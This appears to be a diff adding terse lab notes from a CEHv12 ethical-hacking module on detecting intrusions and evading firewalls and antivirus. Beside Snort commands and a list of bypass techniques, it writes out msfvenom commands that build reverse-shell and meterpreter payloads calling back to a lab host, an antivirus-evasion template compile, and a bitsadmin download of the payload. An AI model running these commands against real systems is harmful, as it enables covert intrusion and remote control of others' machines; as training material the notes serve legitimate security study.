@@ -1,0 +1,73 @@
+Perform intrusion detection using various tools
+
+	• Detect intrusions using Snort
+	• Detect malicious network traffic using ZoneAlarm FREE FIREWALL
+	• Detect malicious network traffic using HoneyBOT
+	• Evade firewalls using various evasion techniques
+
+	• Bypass firewall rules using HTTP/FTP tunneling
+	• Bypass antivirus using Metasploit templates
+	• Bypass firewall through Windows BITSAdmin
+
+
+-------------
+Detect Intrusions using Snort
+	• snort -W
+	• Observe your Ethernet Driver index number
+	• snort -dev -i 1
+
+
+Detect Malicious Network Traffic using ZoneAlarm FREE FIREWALL
+
+Detect Malicious Network Traffic using HoneyBOT
+
+-----------
+
+The following are some firewall bypassing techniques
+
+Port Scanning
+Firewalking
+Banner Grabbing
+IP Address Spoofing
+Source Routing
+Tiny Fragments
+Using an IP Address in Place of URL
+Using Anonymous Website Surfing Sites
+Using a Proxy Server
+ICMP Tunneling
+ACK Tunneling
+HTTP Tunneling
+SSH Tunneling
+DNS Tunneling
+Through External Systems
+Through MITM Attack
+Through Content
+Through XSS Attack
+
+
+ Z:\CEHv12 Module 12 Evading IDS, Firewalls, and Honeypots\HTTP Tunneling Tools\HTTHost and double-click htthost.exe.
+Navigate to Z:\CEHv12 Module 12 Evading IDS, Firewalls, and Honeypots\HTTP Tunneling Tools\HTTPort and double-click httport3snfm.exe.
+
+ Bypass Antivirus using Metasploit Templates
+
+pluma /usr/share/metasploit-framework/data/templates/src/pe/exe/template.c 
+cd /usr/share/metasploit-framework/data/templates/src/pe/exe/ in the terminal and press Enter to navigate to exe folder.
+i686-w64-mingw32-gcc template.c -lws2_32 -o evasion.exe and press Enter
+
+ msfvenom -p windows/shell_reverse_tcp lhost=10.10.1.13 lport=444 -x /usr/share/metasploit-framework/data/templates/src/pe/exe/evasion.exe -f exe > /home/attacker/bypass.exe
+
+
+
+
+
+----
+Bypass Firewall through Windows BITSAdmin
+BITS (Background Intelligent Transfer Service) is an essential component of Windows XP and later versions of Windows operating systems. BITS is used by system administrators and programmers for downloading files from or uploading files to HTTP webservers and SMB file shares.
+
+msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.1.13 lport=444 -f exe > /home/attacker/Exploit.exe
+Type mkdir /var/www/html/share and press Enter to create a shared folder
+Type chmod -R 755 /var/www/html/share and press Enter
+Type chown -R www-data:www-data /var/www/html/share and press Enter
+
+Windows PowerShell to launch a PowerShell.
+bitsadmin /transfer Exploit.exe http://10.10.1.13/share/Exploit.exe c:\Exploit.exe
